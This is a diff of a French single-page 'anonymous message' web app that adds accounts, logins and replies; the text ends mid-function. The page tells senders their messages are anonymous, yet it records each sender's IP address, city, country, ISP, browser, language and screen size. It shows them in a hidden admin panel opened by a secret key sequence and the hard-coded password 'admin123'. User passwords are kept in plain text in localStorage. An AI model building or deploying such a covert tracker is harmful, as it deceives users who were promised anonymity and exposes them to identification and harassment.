@@ -9,27 +9,15 @@
         body{
             font-family:Arial,sans-serif;
             background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
-            min-height:100vh;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            padding:20px;
-            color:#fff;
+            min-height:100vh;display:flex;justify-content:center;align-items:center;
+            padding:20px;color:#fff;
         }
         .container{
-            background:rgba(255,255,255,0.1);
-            backdrop-filter:blur(10px);
-            border-radius:20px;
-            width:100%;
-            max-width:550px;
-            border:1px solid rgba(255,255,255,0.2);
-            overflow:hidden;
+            background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);
+            border-radius:20px;width:100%;max-width:550px;
+            border:1px solid rgba(255,255,255,0.2);overflow:hidden;
         }
-        .header{
-            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
-            padding:25px;
-            text-align:center;
-        }
+        .header{background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center}
         .header h1{font-size:2em;font-weight:800}
         .header p{opacity:0.8;font-size:0.9em}
         .tabs{display:flex;background:rgba(0,0,0,0.3)}
@@ -43,20 +31,21 @@
         .tab-content.active{display:block}
         .input-group{margin-bottom:15px}
         .input-group label{display:block;margin-bottom:5px;font-weight:600}
-        .input-group input,.input-group textarea{
+        .input-group input,.input-group textarea,.input-group select{
             width:100%;padding:12px;background:rgba(255,255,255,0.1);
             border:1px solid rgba(255,255,255,0.2);border-radius:8px;
             font-size:16px;color:#fff;
         }
+        .input-group select option{background:#1a1a2e;color:#fff}
         .input-group textarea{height:100px;resize:vertical}
         .input-group input::placeholder,.input-group textarea::placeholder{color:rgba(255,255,255,0.5)}
         .btn{
-            width:100%;padding:14px;color:#fff;border:none;
-            border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;
-            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
-            margin-bottom:8px;
+            width:100%;padding:14px;color:#fff;border:none;border-radius:8px;
+            font-size:16px;font-weight:600;cursor:pointer;
+            background:linear-gradient(135deg,#667eea,#764ba2);margin-bottom:8px;
         }
         .btn-small{width:auto;padding:8px 16px;font-size:12px;display:inline-block}
+        .btn-reply{background:#00c853;width:auto;padding:8px 16px;font-size:13px;border-radius:15px;margin-top:8px}
         .hidden{display:none!important}
         .link-box{
             background:rgba(0,0,0,0.4);padding:15px;border-radius:10px;
@@ -64,8 +53,7 @@
         }
         .link-box .url{
             font-size:14px;word-break:break-all;color:#667eea;
-            background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;
-            display:block;margin:10px 0;
+            background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;display:block;margin:10px 0;
         }
         .link-box button{
             background:#667eea;color:#fff;border:none;padding:8px 16px;
@@ -75,20 +63,17 @@
             background:rgba(102,126,234,0.2);padding:12px;border-radius:10px;
             text-align:center;margin-bottom:15px;font-weight:600;
         }
-        .message-list{max-height:400px;overflow-y:auto}
+        .message-list{max-height:350px;overflow-y:auto}
         .message-item{
             background:rgba(255,255,255,0.08);padding:15px;border-radius:10px;
             margin-bottom:10px;border-left:4px solid #667eea;
         }
-        .message-item .msg-content{font-size:1em;margin-bottom:8px}
+        .message-item.reply-msg{border-left-color:#00c853}
+        .message-item .msg-content{font-size:1em;margin-bottom:5px}
+        .message-item .msg-from{font-size:0.8em;color:rgba(255,255,255,0.6);margin-bottom:5px}
         .message-item .msg-meta{
             display:flex;justify-content:space-between;align-items:center;
             font-size:0.75em;color:rgba(255,255,255,0.5);
-        }
-        .message-item .reply-btn{
-            color:#00c853;font-size:0.8em;cursor:pointer;
-            background:rgba(0,200,83,0.2);border:none;padding:5px 12px;
-            border-radius:15px;font-weight:600;
         }
         .notification{
             position:fixed;top:15px;right:15px;padding:12px 20px;
@@ -99,13 +84,15 @@
         .empty-state{text-align:center;padding:40px;color:rgba(255,255,255,0.5)}
         .badge{padding:3px 8px;border-radius:15px;font-size:0.7em;font-weight:600}
         .badge-anonymous{background:#667eea}
+        .badge-reply{background:#00c853}
         .badge-admin{background:#f56565}
-        .sender-info{
-            background:rgba(0,0,0,0.3);padding:10px;border-radius:8px;
-            margin-top:10px;font-size:0.85em;
-        }
+        .sender-info{background:rgba(0,0,0,0.3);padding:10px;border-radius:8px;margin-top:10px;font-size:0.85em}
         .sender-info p{margin:3px 0}
         .admin-view{border-left-color:#f56565!important}
+        .login-box{
+            background:rgba(0,0,0,0.4);padding:20px;border-radius:10px;
+            text-align:center;margin-bottom:15px;border:2px solid #667eea;
+        }
         #admin-overlay{
             position:fixed;top:0;left:0;width:100%;height:100%;
             background:rgba(0,0,0,0.9);z-index:999;
@@ -119,15 +106,14 @@
 </head>
 <body>
 
-<!-- Admin Overlay -->
 <div id="admin-overlay" class="hidden">
     <div class="admin-box">
-        <h2 style="color:#ffc107;margin-bottom:15px;">🔐 Accès Admin</h2>
+        <h2 style="color:#ffc107;margin-bottom:15px;">🔐 Admin</h2>
         <div class="input-group">
-            <input type="password" id="adminPassInput" placeholder="Mot de passe admin">
+            <input type="password" id="adminPassInput" placeholder="Mot de passe">
         </div>
         <button class="btn" onclick="loginAdminOverlay()">Se connecter</button>
-        <button class="btn btn-small" style="background:rgba(255,255,255,0.1);margin-top:10px;" onclick="closeAdminOverlay()">❌ Fermer</button>
+        <button class="btn btn-small" style="background:rgba(255,255,255,0.1);margin-top:10px;" onclick="closeAdminOverlay()">Fermer</button>
     </div>
 </div>
 
@@ -138,33 +124,55 @@
     </div>
 
     <div class="tabs" id="tabsContainer">
-        <button class="tab active" id="tab-home-tab" onclick="switchTab('home')">🏠 Mon lien</button>
+        <button class="tab active" id="tab-home-tab" onclick="switchTab('home')">🏠 Créer un compte</button>
         <button class="tab" id="tab-send-tab" onclick="switchTab('send')">📨 Envoyer</button>
         <button class="tab" id="tab-view-tab" onclick="switchTab('view')">💬 Mes messages</button>
     </div>
 
-    <!-- HOME -->
+    <!-- HOME : Créer un compte -->
     <div id="tab-home" class="tab-content active">
-        <h3 style="text-align:center;margin-bottom:15px;">Créez votre lien</h3>
+        <h3 style="text-align:center;margin-bottom:15px;">Créez votre compte</h3>
+        <p style="text-align:center;opacity:0.7;margin-bottom:15px;">Nécessaire pour RECEVOIR des messages</p>
         <div class="input-group">
             <label>Votre nom ou pseudo</label>
             <input type="text" id="userName" placeholder="Ex: Jean">
         </div>
-        <button class="btn" onclick="createLink()">🔗 Générer mon lien</button>
+        <div class="input-group">
+            <label>Mot de passe (pour voir vos messages)</label>
+            <input type="password" id="userPass" placeholder="Choisissez un mot de passe">
+        </div>
+        <button class="btn" onclick="createAccount()">🔗 Créer mon compte</button>
+        
+        <div style="text-align:center;margin:15px 0;">--- ou ---</div>
+        
+        <div class="login-box">
+            <h4 style="margin-bottom:10px;">Déjà un compte ?</h4>
+            <div class="input-group">
+                <select id="loginUserSelect" style="width:100%;padding:12px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;font-size:16px;color:#fff;">
+                    <option value="">-- Choisir --</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <input type="password" id="loginPass" placeholder="Votre mot de passe">
+            </div>
+            <button class="btn" onclick="loginUser()">🔓 Se connecter</button>
+        </div>
+        
         <div id="linkBox" class="link-box hidden">
-            <p>✅ Votre lien personnel :</p>
+            <p>✅ Votre lien à partager :</p>
             <span class="url" id="userUrl"></span>
             <button onclick="copyLink()">📋 Copier le lien</button>
             <p style="margin-top:8px;font-size:0.8em;opacity:0.6;">
-                Partagez ce lien pour recevoir des messages anonymes
+                Partagez ce lien → les gens vous écrivent SANS compte
             </p>
         </div>
     </div>
 
-    <!-- SEND -->
+    <!-- SEND : Envoyer un message (sans compte) -->
     <div id="tab-send" class="tab-content">
-        <div id="destBox" class="dest-info">
+        <div class="dest-info">
             📨 Message pour : <strong><span id="destName">...</span></strong>
+            <br><small style="opacity:0.7;">(Pas besoin de compte pour envoyer)</small>
         </div>
         <div class="input-group">
             <label>Votre message anonyme</label>
@@ -173,17 +181,21 @@
         <button class="btn" onclick="sendMessage()">📨 Envoyer anonymement</button>
     </div>
 
-    <!-- VIEW -->
+    <!-- VIEW : Mes messages (connecté) -->
     <div id="tab-view" class="tab-content">
-        <h3 style="margin-bottom:15px;">💬 Vos messages reçus</h3>
-        <div class="input-group">
-            <label>Qui êtes-vous ?</label>
-            <select id="selectMyUser" onchange="loadMyMessages()" style="width:100%;padding:12px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;font-size:16px;color:#fff;">
-                <option value="">-- Choisissez votre profil --</option>
-            </select>
+        <div id="notLoggedIn">
+            <div class="empty-state">
+                <p>🔒 Connectez-vous pour voir vos messages</p>
+                <button class="btn btn-small" onclick="switchTab('home')">🏠 Se connecter</button>
+            </div>
         </div>
-        <div id="myMessages" class="message-list">
-            <div class="empty-state"><p>📭 Sélectionnez votre profil</p></div>
+        <div id="loggedIn" class="hidden">
+            <p style="margin-bottom:15px;">👤 Connecté : <strong><span id="currentUserName"></span></strong></p>
+            <button class="btn btn-small" style="background:#f56565;margin-bottom:15px;" onclick="logoutUser()">🚪 Déconnexion</button>
+            <h3 style="margin-bottom:15px;">💬 Vos messages reçus</h3>
+            <div id="myMessages" class="message-list">
+                <div class="empty-state"><p>📭 Aucun message reçu</p></div>
+            </div>
         </div>
     </div>
 
@@ -192,17 +204,15 @@
         <button class="btn btn-small" style="background:#f56565;margin-bottom:10px;" onclick="logoutAdmin()">🚪 Déconnexion</button>
         <button class="btn btn-small" style="background:#f56565;margin-bottom:15px;" onclick="clearAll()">🗑️ Tout effacer</button>
         <h3>🔍 Toutes les données</h3>
-        <div id="adminMessages" class="message-list">
-            <div class="empty-state"><p>Chargement...</p></div>
-        </div>
+        <div id="adminMessages" class="message-list"></div>
     </div>
 </div>
 
 <script>
-var DB = 'secretmsg_v4';
+var DB = 'secretmsg_v5';
 var PASS = 'admin123';
 var currentDest = null;
-var currentDestName = '';
+var currentUser = null; // utilisateur connecté
 
 function getData(){
     var d = localStorage.getItem(DB);
@@ -210,26 +220,79 @@ function getData(){
 }
 function saveData(d){localStorage.setItem(DB, JSON.stringify(d));}
 
-// Créer lien
-function createLink(){
+// === CRÉER UN COMPTE ===
+function createAccount(){
     var name = document.getElementById('userName').value.trim();
+    var pass = document.getElementById('userPass').value.trim();
+    
     if(!name){notif('❌ Entrez votre nom','error');return;}
+    if(!pass){notif('❌ Choisissez un mot de passe','error');return;}
+    
     var data = getData();
+    // Vérifier si le nom existe déjà
+    var exists = data.users.find(function(u){return u.username.toLowerCase()===name.toLowerCase();});
+    if(exists){notif('❌ Ce nom existe déjà','error');return;}
+    
     var id = 'u' + Date.now().toString(36) + Math.random().toString(36).substr(2,8);
-    data.users.push({id:id, username:name, created:new Date().toISOString()});
+    data.users.push({id:id, username:name, password:pass, created:new Date().toISOString()});
     saveData(data);
+    
     var url = window.location.origin + window.location.pathname + '?user=' + id;
     document.getElementById('userUrl').textContent = url;
     document.getElementById('linkBox').classList.remove('hidden');
-    loadMyUsers();
-    notif('✅ Lien créé !','success');
-}
-function copyLink(){
-    var url = document.getElementById('userUrl').textContent;
-    navigator.clipboard.writeText(url).then(function(){notif('📋 Copié !','success');});
+    
+    // Connecter automatiquement
+    currentUser = {id:id, username:name};
+    sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
+    
+    loadUserList();
+    notif('✅ Compte créé ! Voici votre lien','success');
 }
 
-// Envoyer message
+function copyLink(){
+    var url = document.getElementById('userUrl').textContent;
+    navigator.clipboard.writeText(url).then(function(){notif('📋 Lien copié !','success');});
+}
+
+// === CONNEXION ===
+function loginUser(){
+    var select = document.getElementById('loginUserSelect');
+    var uid = select.value;
+    var pass = document.getElementById('loginPass').value.trim();
+    
+    if(!uid){notif('❌ Choisissez votre profil','error');return;}
+    if(!pass){notif('❌ Entrez votre mot de passe','error');return;}
+    
+    var data = getData();
+    var user = data.users.find(function(u){return u.id===uid;});
+    
+    if(!user){notif('❌ Utilisateur non trouvé','error');return;}
+    if(user.password !== pass){notif('❌ Mot de passe incorrect','error');return;}
+    
+    currentUser = {id:user.id, username:user.username};
+    sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
+    
+    document.getElementById('loginPass').value = '';
+    notif('✅ Connecté !','success');
+    showLoggedIn();
+    loadMyMessages();
+}
+
+function logoutUser(){
+    currentUser = null;
+    sessionStorage.removeItem('currentUser');
+    document.getElementById('notLoggedIn').classList.remove('hidden');
+    document.getElementById('loggedIn').classList.add('hidden');
+    notif('👋 Déconnecté','success');
+}
+
+function showLoggedIn(){
+    document.getElementById('notLoggedIn').classList.add('hidden');
+    document.getElementById('loggedIn').classList.remove('hidden');
+    document.getElementById('currentUserName').textContent = currentUser.username;
+}
+
+// === ENVOYER MESSAGE (sans compte) ===
 async function sendMessage(){
     if(!currentDest){notif('❌ Ouvrez un lien valide','error');return;}
     var content = document.getElementById('msgContent').value.trim();
@@ -246,72 +309,78 @@ async function sendMessage(){
     data.messages.push({
         id:Date.now(),
         targetId:currentDest,
+        senderId: currentUser ? currentUser.id : null,
+        senderName: currentUser ? currentUser.username : 'Anonyme',
         content:content,
         ip:ip,ville:ville,pays:pays,isp:isp,
-        nav:navigator.userAgent,
-        langue:navigator.language,
+        nav:navigator.userAgent,langue:navigator.language,
         ecran:screen.width+'x'+screen.height,
-        date:new Date().toISOString()
+        date:new Date().toISOString(),
+        isReply: false
     });
     saveData(data);
-    notif('✅ Message envoyé à '+currentDestName+' !','success');
+    
+    notif('✅ Message envoyé !','success');
     document.getElementById('msgContent').value='';
 }
 
-// Répondre à quelqu'un
-function replyTo(targetId, targetName){
-    currentDest = targetId;
-    currentDestName = targetName;
-    document.getElementById('destName').textContent = targetName;
-    document.getElementById('headerText').textContent = 'Réponse à '+targetName;
+// === RÉPONDRE (connecté) ===
+function replyTo(senderId, senderName){
+    if(!currentUser){notif('❌ Connectez-vous pour répondre','error');switchTab('home');return;}
+    
+    currentDest = senderId;
+    document.getElementById('destName').textContent = senderName;
+    document.getElementById('headerText').textContent = 'Réponse à '+senderName;
     switchTab('send');
     document.getElementById('msgContent').focus();
 }
 
-// Charger mes messages
+// === CHARGER MES MESSAGES ===
 function loadMyMessages(){
-    var myId = document.getElementById('selectMyUser').value;
-    var container = document.getElementById('myMessages');
-    if(!myId){container.innerHTML='<div class="empty-state"><p>📭 Sélectionnez votre profil</p></div>';return;}
+    if(!currentUser) return;
     
     var data = getData();
+    var myId = currentUser.id;
     var msgs = data.messages.filter(function(m){return m.targetId===myId;});
-    if(msgs.length===0){container.innerHTML='<div class="empty-state"><p>📭 Aucun message reçu</p></div>';return;}
+    var container = document.getElementById('myMessages');
+    
+    if(msgs.length===0){
+        container.innerHTML='<div class="empty-state"><p>📭 Aucun message reçu</p><p style="font-size:0.8em;">Partagez votre lien pour en recevoir !</p></div>';
+        return;
+    }
     
     msgs.sort(function(a,b){return b.id-a.id;});
     
-    // Trouver les autres utilisateurs pour les réponses
-    var otherUsers = data.users.filter(function(u){return u.id!==myId;});
-    
     container.innerHTML = msgs.map(function(m){
-        // Trouver un utilisateur aléatoire pour répondre (celui qui a reçu le moins de messages)
-        var replyToUser = otherUsers.length>0 ? otherUsers[Math.floor(Math.random()*otherUsers.length)] : null;
+        var senderLabel = m.senderName || 'Anonyme';
+        var replyBtn = '';
         
-        var replyHTML = '';
-        if(replyToUser){
-            replyHTML = '<button class="reply-btn" onclick="replyTo(\''+replyToUser.id+'\',\''+escHtml(replyToUser.username)+'\')">💬 Répondre à '+escHtml(replyToUser.username)+'</button>';
+        // Si l'expéditeur a un compte, on peut lui répondre
+        if(m.senderId && m.senderId !== myId){
+            replyBtn = '<button class="btn-reply" onclick="replyTo(\''+m.senderId+'\',\''+escHtml(senderLabel)+'\')">💬 Répondre</button>';
         }
         
         return '<div class="message-item">'+
+            '<p class="msg-from">De : <strong>'+escHtml(senderLabel)+'</strong></p>'+
             '<p class="msg-content">'+escHtml(m.content)+'</p>'+
             '<div class="msg-meta">'+
                 '<span>📅 '+new Date(m.date).toLocaleString('fr-FR')+'</span>'+
-                '<span>'+replyHTML+'</span>'+
+                replyBtn+
             '</div>'+
         '</div>';
     }).join('');
 }
 
-function loadMyUsers(){
+function loadUserList(){
     var data = getData();
-    var opts = '<option value="">-- Choisissez votre profil --</option>';
+    var opts = '<option value="">-- Choisir --</option>';
     data.users.forEach(function(u){
         opts+='<option value="'+u.id+'">'+escHtml(u.username)+'</option>';
     });
-    document.getElementById('selectMyUser').innerHTML=opts;
+    document.getElementById('loginUserSelect').innerHTML = opts;
 }
 
-// URL
+// === URL ===
 function checkUrl(){
     var params = new URLSearchParams(window.location.search);
     var uid = params.get('user');
@@ -320,7 +389,6 @@ function checkUrl(){
         var user = data.users.find(function(u){return u.id===uid;});
         if(user){
             currentDest = uid;
-            currentDestName = user.username;
             document.getElementById('destName').textContent = user.username;
             document.getElementById('headerText').textContent = 'Message pour '+user.username;
             switchTab('send');
@@ -328,7 +396,7 @@ function checkUrl(){
     }
 }
 
-// Admin
+// === ADMIN ===
 var keyBuf = '';
 document.addEventListener('keydown',function(e){
     keyBuf += e.key.toLowerCase();
@@ -343,16 +411,14 @@ function loginAdminOverlay(){
     if(document.getElementById('adminPassInput').value===PASS){
         sessionStorage.setItem('adm','1');
         document.getElementById('admin-overlay').classList.add('hidden');
-        showAdmin();
-        notif('✅ Admin connecté','success');
-        loadAdmin();
-    }else{notif('❌ Mot de passe incorrect','error');}
+        showAdmin();notif('✅ Admin','success');loadAdmin();
+    }else{notif('❌ Erreur','error');}
 }
 function closeAdminOverlay(){document.getElementById('admin-overlay').classList.add('hidden');}
 function showAdmin(){
     if(!document.getElementById('tab-admin-tab')){
-        var t = document.getElementById('tabsContainer');
-        var b = document.createElement('button');
+        var t=document.getElementById('tabsContainer');
+        var b=document.createElement('button');
         b.className='tab';b.id='tab-admin-tab';b.textContent='🔑 Admin';
         b.onclick=function(){switchTab('admin');};
         t.appendChild(b);
@@ -361,55 +427,43 @@ function showAdmin(){
 }
 function logoutAdmin(){
     sessionStorage.removeItem('adm');
-    var t = document.getElementById('tab-admin-tab');if(t)t.remove();
+    var t=document.getElementById('tab-admin-tab');if(t)t.remove();
     document.getElementById('tab-admin').classList.remove('active');
     switchTab('home');notif('👋 Déconnecté','success');
 }
 function loadAdmin(){
     if(!isAdmin())return;
-    var data = getData();
-    var c = document.getElementById('adminMessages');
+    var data=getData();var c=document.getElementById('adminMessages');
     if(data.messages.length===0){c.innerHTML='<div class="empty-state"><p>📭 Aucun message</p></div>';return;}
     data.messages.sort(function(a,b){return b.id-a.id;});
-    c.innerHTML = data.messages.map(function(m,i){
-        var tgt = data.users.find(function(u){return u.id===m.targetId;});
+    c.innerHTML=data.messages.map(function(m,i){
+        var tgt=data.users.find(function(u){return u.id===m.targetId;});
         return '<div class="message-item admin-view">'+
             '<p><strong>💬 :</strong> '+escHtml(m.content)+'</p>'+
             '<div class="sender-info">'+
-                '<p>🌐 IP : '+m.ip+'</p><p>📍 '+m.ville+', '+m.pays+'</p><p>📡 '+m.isp+'</p>'+
-                '<p>🖥️ '+m.nav+'</p><p>🗣️ '+m.langue+'</p><p>📱 '+m.ecran+'</p>'+
+                '<p>👤 De : '+escHtml(m.senderName)+'</p>'+
                 '<p>🎯 Pour : '+(tgt?escHtml(tgt.username):'?')+'</p>'+
+                '<p>🌐 IP : '+m.ip+'</p><p>📍 '+m.ville+', '+m.pays+'</p>'+
+                '<p>📡 '+m.isp+'</p><p>🖥️ '+m.nav+'</p>'+
                 '<p>📅 '+new Date(m.date).toLocaleString('fr-FR')+'</p>'+
             '</div>'+
-            '<div class="msg-meta"><span>#'+(i+1)+'</span><span class="badge badge-admin">Admin</span></div>'+
         '</div>';
     }).join('');
 }
 function clearAll(){
     if(!confirm('Supprimer TOUS les messages ?'))return;
-    var data = getData();data.messages=[];saveData(data);
+    var data=getData();data.messages=[];saveData(data);
     notif('✅ Supprimé','success');loadAdmin();
 }
 
-// Onglets
+// === ONGLETS ===
 function switchTab(name){
     document.querySelectorAll('.tab-content').forEach(function(c){c.classList.remove('active');});
     document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
-    var ct = document.getElementById('tab-'+name);if(ct)ct.classList.add('active');
-    var tb = document.getElementById('tab-'+name+'-tab');if(tb)tb.classList.add('active');
-    if(name==='view')loadMyMessages();
+    var ct=document.getElementById('tab-'+name);if(ct)ct.classList.add('active');
+    var tb=document.getElementById('tab-'+name+'-tab');if(tb)tb.classList.add('active');
+    if(name==='view'&&currentUser){showLoggedIn();loadMyMessages();}
     if(name==='admin'&&isAdmin())loadAdmin();
 }
 
-function escHtml(t){var d=document.createElement('div');d.textContent=t;return d.innerHTML;}
-function notif(m,type){
-    var n=document.createElement('div');n.className='notification '+type;n.textContent=m;
-    document.body.appendChild(n);setTimeout(function(){n.remove();},3000);
-}
-
-if(isAdmin()){showAdmin();loadAdmin();}
-loadMyUsers();
-checkUrl();
-</script>
-</body>
-</html>
+function escHtml(t){var d=document.createElement
